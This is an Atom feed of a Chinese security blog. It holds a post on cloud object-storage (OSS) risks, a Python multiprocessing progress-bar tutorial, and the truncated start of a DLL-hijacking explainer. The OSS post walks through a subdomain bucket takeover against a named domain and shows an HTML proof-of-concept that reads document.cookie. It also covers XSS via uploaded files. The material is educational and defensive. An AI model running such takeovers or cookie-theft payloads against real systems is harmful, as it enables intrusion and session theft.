<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ol4three</title>
  
  <subtitle>一个专注于信息安全技术的白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.ol4three.com/"/>
  <updated>2023-03-30T03:16:05.624Z</updated>
  <id>http://www.ol4three.com/</id>
  
  <author>
    <name>ol4three</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>OSS云存储相关安全风险</title>
    <link href="http://www.ol4three.com/2022/07/27/WEB/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/"/>
    <id>http://www.ol4three.com/2022/07/27/WEB/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/</id>
    <published>2022-07-27T10:25:17.000Z</published>
    <updated>2023-03-30T03:16:05.624Z</updated>
    
    <content type="html"><![CDATA[<p>​    OSS服务作为一项重要的云上服务，承担了存储用户数据的重要功能。对象存储服务提供了细粒度的访问权限控制功能，以保证用户数据的安全性。<strong>如果使用OSS服务时安全意识不足或对访问权限以及访问策略错误理解，将会导致数据被非法访问或篡改，产生严重后果。</strong></p><p>本文将介绍下相关OSS云存储相关方面的风险问题，老规矩先上一张图。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330091632227.png" alt="image-20230330091632227" style="zoom:50%;"> <a id="more"></a><h2 id="0x00-础介绍"><a href="#0x00-础介绍" class="headerlink" title="0x00 础介绍"></a>0x00 础介绍</h2><blockquote><p>​    对象存储OSS是一种云存储服务，可以存储大量非结构化数据，例如图像、视频和文本等。由于 OSS 是一种公共云服务，因此存在安全方面的问题。其中，最大的问题之一是数据隐私和安全。企业应该制定一些安全措施来保护数据的机密性和完整性。例如，使用加密技术对数据进行加密，并使用访问控制策略来限制用户对数据的访问。</p></blockquote><p>​    对象存储作为云原生的一项重要功能，面临着一系列安全挑战。但在对象存储所导致的安全问题中，绝大部分是由于用户使用此功能时错误的配置导致的。据统计，由于缺乏经验或人为错误导致的存储桶错误配置所造成的安全问题占所有云安全漏洞的16%。例如<strong>2017年美国新闻与金融信息公司道琼斯（Dow Jones &amp; Company）发生用户数据泄露事件</strong>，安全研究人员在亚马逊云服务器上发现440万道琼斯客户的细节信息，被泄露信息包含<strong>客户姓名、ID、住址、订阅细节、信用卡后四位和部分电话号码</strong>。 道琼斯公司已确认此事，称有220万客户数据受影响，数据泄露的主要原因是道琼斯公司对服务器的权限配置错误。</p><p>下面将介绍下对象存储OSS产品中涉及的几个基本概念，方便后续对其涉及到的安全风险更好的了解。</p><h3 id="存储空间（Bucket）"><a href="#存储空间（Bucket）" class="headerlink" title="存储空间（Bucket）"></a>存储空间（Bucket）</h3><p>存储空间是用户用于存储对象（Object）的容器，所有的对象都必须隶属于某个存储空间。存储空间具有各种配置属性，包括地域、访问权限、存储类型等。用户可以根据实际需求，创建不同类型的存储空间来存储不同的数据。</p><h3 id="对象（Object）"><a href="#对象（Object）" class="headerlink" title="对象（Object）"></a>对象（Object）</h3><p>对象是OSS存储数据的基本单元，也被称为OSS的文件。和传统的文件系统不同，对象没有文件目录层级结构的关系。对象由元信息（Object Meta），用户数据（Data）和文件名（Key）组成，并且由存储空间内部唯一的Key来标识。对象元信息是一组键值对，表示了对象的一些属性，比如最后修改时间、大小等信息，同时用户也可以在元信息中存储一些自定义的信息。对象的生命周期是从上传成功到被删除为止。在整个生命周期内，除通过追加方式上传的Object可以通过继续追加上传写入数据外，其他方式上传的Object内容无法编辑。</p><h3 id="OjbectKey"><a href="#OjbectKey" class="headerlink" title="OjbectKey"></a>OjbectKey</h3><p>在各语言SDK中，ObjectKey、Key以及ObjectName是同一概念，均表示对Object执行相关操作时需要填写的Object名称。例如向某一存储空间上传Object时，ObjectKey表示上传的Object所在存储空间的完整名称，即包含文件后缀在内的完整路径，如填写为abc/efg/123.jpg。</p><h3 id="Region（地域）"><a href="#Region（地域）" class="headerlink" title="Region（地域）"></a>Region（地域）</h3><p>Region表示OSS的数据中心所在物理位置。用户可以根据费用、请求来源等选择合适的地域创建Bucket。一般来说，距离用户更近的Region访问速度更快。Region是在创建Bucket的时候指定的，一旦指定之后就不允许更改。该Bucket下所有的Object都存储在对应的数据中心，目前不支持Object级别的Region设置。</p><h3 id="Endpoint（访问域名）"><a href="#Endpoint（访问域名）" class="headerlink" title="Endpoint（访问域名）"></a>Endpoint（访问域名）</h3><p>Endpoint表示OSS对外服务的访问域名。OSS以HTTP RESTful API的形式对外提供服务，当访问不同的Region的时候，需要不同的域名。通过内网和外网访问同一个Region所需要的Endpoint也是不同的。</p><h3 id="6-AccessKey（访问密钥）"><a href="#6-AccessKey（访问密钥）" class="headerlink" title="6.AccessKey（访问密钥）"></a>6.AccessKey（访问密钥）</h3><p>AccessKey简称AK，指的是访问身份验证中用到的<strong>AccessKey</strong> ID和<strong>AccessKey Secret</strong>。OSS通过使用AccessKey ID和AccessKey Secret对称加密的方法来验证某个请求的发送者身份。AccessKey ID用于标识用户；AccessKey Secret是用户用于加密签名字符串和OSS用来验证签名字符串的密钥，必须保密。</p><p>AccessKey包含以下三种：</p><ul><li>Bucket的拥有者申请的AccessKey。</li><li>被Bucket的拥有者通过RAM授权给第三方请求者的AccessKey。</li><li>被Bucket的拥有者通过STS授权给第三方请求者的AccessKey。</li></ul><h3 id="AK-SK访问控制"><a href="#AK-SK访问控制" class="headerlink" title="AK/SK访问控制"></a>AK/SK访问控制</h3><p>原始AK/SK是指您在注册OSS服务时，系统自动分配的AK（Access Key ID） / SK（Secret Access Key）。主要用于对用户的调用行为进行鉴权和认证，相当于API专用的用户名及密码。您向OSS发送的每个请求，都需要通过鉴权认证通过后，OSS才会处理您的请求。</p><p>移动端场景使用原始AK/SK鉴权的交互过程如下图所示：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330092537813.png" alt="image-20230330092537813"></p><p>使用原始的AK/SK下发到移动端势必会存在一定的安全风险，因此，原始AK/SK鉴权方式只推荐您在测试过程中使用，提供正式服务时推荐使用STS方式鉴权。</p><p><strong>STS临时授权访问</strong></p><p>BOS可以通过STS机制实现第三方的临时授权访问。STS（Security Token Service）是由OSS服务商提供的临时授权服务。通过STS，您可以为第三方用户颁发一个自定义时效和权限的访问凭证。第三方用户可以使用该访问凭证直接调用API访问OSS资源。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330092606510.png" alt="image-20230330092606510"></p><p><strong>使用STS的优点：</strong></p><ul><li>不需要向第三方用户透露您的管理账号或AK/SK信息，只需要向STS申请一个<strong>临时访问凭证</strong>并颁发给第三方用户即可，且这个访问凭证拥有的权限和有效期均可由自己去定义。</li><li>您不需要关注该权限的撤销问题，<strong>临时访问凭证在过期后会自动失效</strong>。</li><li>STS临时访问的权限也需要进行严格把控，利用STS申请的AK/SK、临时凭证Token也会存在一定的<strong>安全风险</strong>。</li></ul><h2 id="0x01-常见风险点"><a href="#0x01-常见风险点" class="headerlink" title="0x01 常见风险点"></a>0x01 常见风险点</h2><p>常见的OSS安全风险点有如下几种，下面将会分别进行介绍。</p><h3 id="存储空间访问权限"><a href="#存储空间访问权限" class="headerlink" title="存储空间访问权限"></a>存储空间访问权限</h3><p>存储空间（Bucket）是存储对象（Object）的容器。对象都隶属于存储空间，存储空间的访问权限（ACL）有以下三类：</p><table><thead><tr><th>访问权限</th><th>描述</th><th>访问权限值</th></tr></thead><tbody><tr><td>私有</td><td>存储空间的拥有者和授权用户有文件的读写权限，其他用户没有权限操作文件。</td><td>oss.ACLPrivate</td></tr><tr><td>公共读</td><td>存储空间的拥有者和授权用户有文件的读写权限，其他用户只有读权限。请谨慎使用该权限。</td><td>oss.ACLPublicRead</td></tr><tr><td>公共读写</td><td>所有用户都有文件的读写权限。请谨慎使用该权限。</td><td>oss.ACLPublicReadWrite</td></tr></tbody></table><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330092659927.png" alt="image-20230330092659927" style="zoom:50%;"><p>在上传文件（Object）时未指定文件的ACL，则文件的ACL均默认继承Bucket ACL。 故申请OSS Bucket一般<strong>禁止申请公共读写</strong>。<strong>公共读写意味着互联网上任何用户都可以对该Object进行访问，并且向该Object写入数据</strong>。这有可能造成数据的外泄以及费用激增，若被人恶意写入违法信息还可能会影响公司商誉。</p><p>如果想加速文件访问，可以配置OSS 私有Bucket回源。但需要注意，开启OSS私有Bucket回源授权后，即授权CDN对您所有Bucket的只读权限，不只是对当前Bucket授权。</p><h3 id="AccessKey泄漏"><a href="#AccessKey泄漏" class="headerlink" title="AccessKey泄漏"></a>AccessKey泄漏</h3><p>AccessKey是用户访问内部资源最重要的身份凭证。用户调用API时的通信加密和身份认证会使用API凭证（即基于非对称密钥算法的鉴权密钥对）。API凭证是云上用户调用云服务API、访问云上资源的唯一身份凭证。API凭证相当于登录密码。用户可以使用<strong>AccessKey（简称AK）构造一个API请求（或者使用云服务**</strong>SDK<strong>**）来操作资源。AccessKey包括AccessKey ID和AccessKey Secret。其中AccessKey ID用于标识用户，AccessKey Secret是用来验证用户身份合法性的密钥。AccessKey Secret必须保密。</strong></p><p>但在实际开发过程中，部分开发人员意识不强。前端开发者有些会直接使用<strong>SDK**</strong>上传，硬编码AccessKey进行上传，这种方式极其危险<strong>，前端禁止使用该操作上传文件。可以让后端上传，或者通过STS服务颁发一个临时访问凭证。该临时访问凭证可在规定时间内访问OSS资源。临时访问凭证无需透露长期密钥，使OSS资源访问相对安全。但是同时</strong>STS认证权限存在问题仍然会导致严重后果**：</p><ol><li><strong>利用 AK/SK泄漏调用IAM权限进行用户级操作</strong></li><li><strong>利用 AK/SK泄漏调用Bucket相关权限操作</strong></li></ol><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330093633261.png" alt="image-20230330093633261"></p><h3 id="文件覆盖风险"><a href="#文件覆盖风险" class="headerlink" title="文件覆盖风险"></a>文件覆盖风险</h3><p>如果在<strong>配置存储桶</strong>时，管理员错误的<strong>将存储桶权限，配置为可写</strong>，这将会导致攻击者可上传任意文件到存储桶中，或覆盖已经存在的文件。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330093924697.png" alt="image-20230330093924697"></p><p>如果错误配置权限，可以通过<strong>去除掉PutObject权限</strong>方式解决。但如果必须使用到该权限，该如何做呢？</p><blockquote><p>在Web、App等应用开发中，经常会发生此类问题。例如场景：在一个Web应用使用对象存储来存储用户上传视频，且通过客户端直传的方式将用户上传的视频上传至Bucket中，并希望在存储桶/app/路径中存储桶用户的头像，由于后端开发时为了方便而进行了不规范的存储桶Policy配置，在生成用户用以上传视频的临时密钥时直接将此临时密钥允许访问的 resource 指定为 acs:oss:<em>:</em>:app/image/<em>路径。 这样以来，系统为每个用户所生成的用以上传的临时密钥虽然不相同，但是这个临时密钥都拥有acs:oss:</em>:<em>:app/image/</em>路径中的所有资源的读写权限，<strong>这将会带来严重的安全问题</strong>。</p></blockquote><p>此时<strong>可通过控制Policy</strong>，限制生成的临时认证权限。通过每个用户的用户标识来为每一个用户设置一个独用的路径，例如可以在为用户生成临时密钥时，<strong>将policy中resource 指定为 acs:oss:***</strong>:<strong>***:app/image/${user_id}/</strong></p><h3 id="Bucket接管风险"><a href="#Bucket接管风险" class="headerlink" title="Bucket接管风险"></a>Bucket接管风险</h3><p>当我们正常进行测试并访问static-good-boy.huoxian.cn。</p><p>1、static-good-boy.huoxian.cn指向了static-good-boy.oss-cn-beijing.aliyuncs.com这个子域名</p><p>2、static-good-boy.oss-cn-beijing.aliyuncs.com这个桶不存在</p><p>也就是说我只要申请 static-good-boy这个桶，那么我就可以控制static-good-boy.oss-cn-beijing.aliyuncs.com的内容，而static-good-boy.huoxian.cn指向了static-good-boy.oss-cn-beijing.aliyuncs.com，就相当于变相的控制了static-good-boy.huoxian.cn，而在static-good-boy.huoxian.cn上窃取其他huoxian.cn子域名的一些cookie等信息是有很大可能的~</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330095020126.png" alt="image-20230330095020126" style="zoom:50%;"><p>创建同名Bucket</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330095041385.png" alt="image-20230330095041385" style="zoom:50%;"><p>创建完成后，上传文件进行测试</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta&gt;</span><br><span class="line">take over by mkdd~&lt;br&gt;</span><br><span class="line">&lt;input value=&quot;click&quot; onclick=&quot;alert(document.cookie)&quot;&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>成功上传后访问链接，成功<strong>接管</strong>OSS服务</p><p>static-good-boy.huoxian.cn/mkdd.html</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330095137450.png" alt="image-20230330095137450" style="zoom:50%;"><h3 id="XSS风险"><a href="#XSS风险" class="headerlink" title="XSS风险"></a>XSS风险</h3><p>如果目标的对象存储支持 html 解析，那就可以利用<strong>任意文件上传</strong>进行 <strong>XSS</strong> <strong>钓鱼、挂暗链、挂黑页、供应链投毒</strong>等操作，常见的文件有<strong>SVG、html</strong>等文件，会被OSS解析。研发在使用对象存储时，需要根据业务需要在服务端先<strong>校验文件后缀类型</strong>，再校验Content-Type是否属与此后缀类型相匹配；储存方需要对文件后缀类型与文件MIME强关联，<strong>例如禁止jpeg后缀的文件MIME变成text/html。</strong></p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330095231355.png" alt="image-20230330095231355" style="zoom:50%;"><h3 id="内容安全"><a href="#内容安全" class="headerlink" title="内容安全"></a>内容安全</h3><p>除了常见的OSS应用安全之外，还有上传内容安全也值得注意。随着业务的急剧发展，上面的数据呈现爆炸式增长。上传大量的的视频、图片，这些日益增长的内容中充斥着各种不可控的风险因素，例如<strong>色情视频和图片、涉政暴恐内容、各种垃圾广告</strong>等。随着政府监管的日渐严格，<strong>网站及平台需要加强对网站内容的管理和检测。所以对于上传文件的输入点，需要接入风控进行审核</strong>。</p><h2 id="0x02-安全建设意见"><a href="#0x02-安全建设意见" class="headerlink" title="0x02 安全建设意见"></a>0x02 安全建设意见</h2><h3 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h3><p>使用加密技术对数据进行加密，保护数据的机密性和完整性。同时，应该确保加密密钥的安全性。</p><h3 id="强化身份认证"><a href="#强化身份认证" class="headerlink" title="强化身份认证"></a>强化身份认证</h3><p>采用多重身份认证方式，例如密码、短信验证码、生物识别等，以提高用户身份认证的安全性。</p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>采用访问控制策略控制用户对数据的访问权限，限制不必要的访问。</p><h3 id="数据备份和恢复"><a href="#数据备份和恢复" class="headerlink" title="数据备份和恢复"></a>数据备份和恢复</h3><p>建立相应的备份和恢复策略，以确保在出现故障或存在勒索行为时可以快速恢复数据。</p><h3 id="安全漏洞管理"><a href="#安全漏洞管理" class="headerlink" title="安全漏洞管理"></a>安全漏洞管理</h3><ol><li>采用网络安全技术，例如防火墙、入侵检测系统等，加强对OSS的网络安全保护。</li><li>建立安全漏洞管理机制，及时发现和修复潜在的安全漏洞，以减少安全风险。</li></ol><h3 id="安全监管"><a href="#安全监管" class="headerlink" title="安全监管"></a>安全监管</h3><p>建立安全监管机制，对企业的安全管理进行监管，确保企业的安全策略得到执行。</p><h3 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h3><p>定期对 OSS 进行安全审计，及时发现和修复潜在的安全漏洞。</p><h3 id="安全培训"><a href="#安全培训" class="headerlink" title="安全培训"></a>安全培训</h3><p>对员工进行安全培训，提高员工的安全意识和安全素养，降低因员工操作失误导致的安全问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    OSS服务作为一项重要的云上服务，承担了存储用户数据的重要功能。对象存储服务提供了细粒度的访问权限控制功能，以保证用户数据的安全性。&lt;strong&gt;如果使用OSS服务时安全意识不足或对访问权限以及访问策略错误理解，将会导致数据被非法访问或篡改，产生严重后果。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;本文将介绍下相关OSS云存储相关方面的风险问题，老规矩先上一张图。&lt;/p&gt;
&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330091632227.png&quot; alt=&quot;image-20230330091632227&quot; style=&quot;zoom:50%;&quot;&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="OSS" scheme="http://www.ol4three.com/tags/OSS/"/>
    
      <category term="云存储" scheme="http://www.ol4three.com/tags/%E4%BA%91%E5%AD%98%E5%82%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python多线程实现进度条</title>
    <link href="http://www.ol4three.com/2022/06/07/WEB/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0%E8%BF%9B%E5%BA%A6%E6%9D%A1/"/>
    <id>http://www.ol4three.com/2022/06/07/WEB/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0%E8%BF%9B%E5%BA%A6%E6%9D%A1/</id>
    <published>2022-06-07T00:51:06.000Z</published>
    <updated>2023-03-07T01:22:48.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python多线程显示进度条的方式"><a href="#Python多线程显示进度条的方式" class="headerlink" title="Python多线程显示进度条的方式"></a>Python多线程显示进度条的方式</h1><p>使用python进行多线程任务时，有时需要获取及时进度来清晰的感知的任务进度，目前收集以下几种实用的方式。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230307090922846.png" alt="image-20230307090922846"></p><a id="more"></a><h2 id="使用-multiprocessing-进行记录"><a href="#使用-multiprocessing-进行记录" class="headerlink" title="使用 multiprocessing 进行记录"></a>使用 <code>multiprocessing</code> 进行记录</h2><p>利用 <code>callback</code>来检测每个任务的完成，返回值为主函数的return。<strong>apply_async(subprocess, args=(i,), callback=log)</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/23 14:15</span></span><br><span class="line"><span class="comment"># @Author  : zhouyuyao</span></span><br><span class="line"><span class="comment"># @File    : demon1.py</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">global</span> max</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">i</span>):</span></span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    flag =  flag + <span class="number">1</span></span><br><span class="line">    print(process_bar(flag, max))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_bar</span>(<span class="params">num, total</span>):</span></span><br><span class="line">    print(num,total)</span><br><span class="line">    rate = float(num)/total</span><br><span class="line">    ratenum = int(<span class="number">50</span>*rate)</span><br><span class="line">    r = <span class="string">&quot;[%s%s]&quot;</span> % (<span class="string">&#x27;&gt;&#x27;</span>*ratenum, <span class="string">&#x27; &#x27;</span>*(<span class="number">50</span>-ratenum))</span><br><span class="line">    <span class="comment">#r = f&quot;\\r[&#123;&#x27;&gt;&#x27;*ratenum&#125;&#123;&#x27; &#x27;*(30-ratenum)&#125; ](&#123;num,&#125;/&#123;total&#125;) &quot;</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subprocess</span>(<span class="params">number</span>):</span></span><br><span class="line">    <span class="comment"># 子进程</span></span><br><span class="line">    callback_res = <span class="string">&quot;call back&quot;</span></span><br><span class="line">    print(<span class="string">&#x27;这是第&#123;0&#125;个子进程&#x27;</span>.format(number))</span><br><span class="line">    pid = os.getpid()              <span class="comment"># 得到当前进程号</span></span><br><span class="line">    print(<span class="string">&#x27;当前进程号：&#123;0&#125;，开始时间：&#123;1&#125;&#x27;</span>.format(pid, datetime.now().isoformat()))</span><br><span class="line">    time.sleep(<span class="number">2</span>)                 <span class="comment"># 当前进程休眠30秒</span></span><br><span class="line">    print(<span class="string">&#x27;当前进程号：&#123;0&#125;，结束时间：&#123;1&#125;&#x27;</span>.format(pid, datetime.now().isoformat()))</span><br><span class="line">    <span class="keyword">return</span> callback_res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 主进程</span></span><br><span class="line">    print(<span class="string">&#x27;这是主进程，进程编号：&#123;0&#125;&#x27;</span>.format(os.getpid()))</span><br><span class="line">    t_start = datetime.now()</span><br><span class="line">    max = <span class="number">4</span></span><br><span class="line">    pool = multiprocessing.Pool(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        pool.apply_async(subprocess, args=(i,), callback=log)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    t_end = datetime.now()</span><br><span class="line">    print(<span class="string">&#x27;主进程用时：&#123;0&#125;毫秒&#x27;</span>.format((t_end - t_start).microseconds))</span><br></pre></td></tr></table></figure><h2 id="使用ProcessPoolExecutor-进行记录"><a href="#使用ProcessPoolExecutor-进行记录" class="headerlink" title="使用ProcessPoolExecutor 进行记录"></a>使用<code>ProcessPoolExecutor</code> 进行记录</h2><p><a href="https://www.cnblogs.com/goldsunshine/p/16878089.html">python 线程池 ThreadPoolExecutor</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, FIRST_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">second</span>):</span></span><br><span class="line">    print(second)</span><br><span class="line">    time.sleep(second)</span><br><span class="line">    <span class="keyword">return</span> second</span><br><span class="line"></span><br><span class="line">lists = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">all_task = []</span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">2</span>) <span class="keyword">as</span> pool:</span><br><span class="line">    <span class="keyword">for</span> second <span class="keyword">in</span> lists:</span><br><span class="line">        all_task.append(pool.submit(action, second))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(all_task):</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;future.result()&#125;</span> 返回&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;----complete-----&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="使用队列-queue-的方式进行返回"><a href="#使用队列-queue-的方式进行返回" class="headerlink" title="使用队列 queue 的方式进行返回"></a>使用队列 <code>queue</code> 的方式进行返回</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/23 14:15</span></span><br><span class="line"><span class="comment"># @Author  : zhouyuyao</span></span><br><span class="line"><span class="comment"># @File    : demon1.py</span></span><br><span class="line"><span class="keyword">import</span> queue,time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">url_queue</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> url_queue.empty():</span><br><span class="line">        url_list = url_queue.get()</span><br><span class="line">        i = url_list[<span class="number">0</span>]</span><br><span class="line">        num = url_list[<span class="number">1</span>]</span><br><span class="line">    print(i*<span class="number">30</span>)</span><br><span class="line">    print(<span class="string">f&quot;is Ok <span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url_queue = queue.Queue(maxsize=<span class="number">5</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    all_task = []</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">8</span>) <span class="keyword">as</span> pool:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            url_queue.put([url, num])</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            all_task.append(pool.submit(run, url_queue))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Python多线程显示进度条的方式&quot;&gt;&lt;a href=&quot;#Python多线程显示进度条的方式&quot; class=&quot;headerlink&quot; title=&quot;Python多线程显示进度条的方式&quot;&gt;&lt;/a&gt;Python多线程显示进度条的方式&lt;/h1&gt;&lt;p&gt;使用python进行多线程任务时，有时需要获取及时进度来清晰的感知的任务进度，目前收集以下几种实用的方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230307090922846.png&quot; alt=&quot;image-20230307090922846&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Code" scheme="http://www.ol4three.com/categories/Code/"/>
    
    
      <category term="Python" scheme="http://www.ol4three.com/tags/Python/"/>
    
      <category term="multiprocessing" scheme="http://www.ol4three.com/tags/multiprocessing/"/>
    
      <category term="ProcessPoolExecutor" scheme="http://www.ol4three.com/tags/ProcessPoolExecutor/"/>
    
      <category term="queue" scheme="http://www.ol4three.com/tags/queue/"/>
    
  </entry>
  
  <entry>
    <title>DLL劫持漏洞详解</title>
    <link href="http://www.ol4three.com/2022/05/29/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>http://www.ol4three.com/2022/05/29/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</id>
    <published>2022-05-29T06:41:33.000Z</published>
    <updated>2023-01-30T09:56:43.988Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-DLL是什么"><a href="#1-DLL是什么" class="headerlink" title="1.DLL是什么"></a>1.DLL是什么</h1><blockquote><p>DLL是Dynamic Link Library的缩写，意为动态链接库。在Windows中，许多应用程序并不是一个完整的<a href="https://baike.baidu.com/item/可执行文件?fromModule=lemma_inlink">可执行文件</a>，它们被分割成一些相对独立的动态链接库，即<a href="https://baike.baidu.com/item/DLL文件?fromModule=lemma_inlink">DLL文件</a>，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可有多个DLL文件，一个DLL文件也可能被几个应用程序所共用，这样的DLL文件被称为共享DLL文件。</p><p>1．静态调用方式：由<a href="https://baike.baidu.com/item/编译系统?fromModule=lemma_inlink">编译系统</a>完成对 DLL 的加载和应用程序结束时 DLL <a href="https://baike.baidu.com/item/卸载?fromModule=lemma_inlink">卸载</a>的编码（如还有其它程序使用该 DLL，则 Windows 对 DLL 的应用记录减1，直到所有相关程序都结束对该 DLL 的使用时才释放它，简单实用，但不够灵活，只能满足一般要求。</p><p>2．动态调用方式：是由编程者用 API 函数加载和<a href="https://baike.baidu.com/item/卸载?fromModule=lemma_inlink">卸载</a> DLL 来达到调用 DLL 的目的，使用上较复杂，但能更加有效地使用内存，是编制大型应用程序时的重要方式。</p></blockquote><a id="more"></a><h1 id="2-环境"><a href="#2-环境" class="headerlink" title="2.环境"></a>2.环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windwos Server 2012</span><br><span class="line">Windows 10</span><br><span class="line">Vs2019</span><br><span class="line">Procmon.exe</span><br><span class="line">notepad++ v6.6.6</span><br></pre></td></tr></table></figure><h1 id="3-漏洞原因"><a href="#3-漏洞原因" class="headerlink" title="3.漏洞原因"></a>3.漏洞原因</h1><p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。这就是所谓的DLL劫持。</p><p>DLL劫持漏洞翻译成英文叫做 DLL Hijacking Vulnerability，CWE将其归类为Untrusted Search Path Vulnerability。如果想要去CVE数据库中搜索DLL劫持漏洞案例，搜索这两个关键词即可。可见DLL劫持额主要原因是目录搜索的问题，我们来看一下DLL的搜索目录</p><p>在<code>Windows XP SP2</code>之前，Windows查找DLL的目录以及对应的顺序如下：</p><ol><li>进程对应的应用程序所在目录；</li><li>当前目录（Current 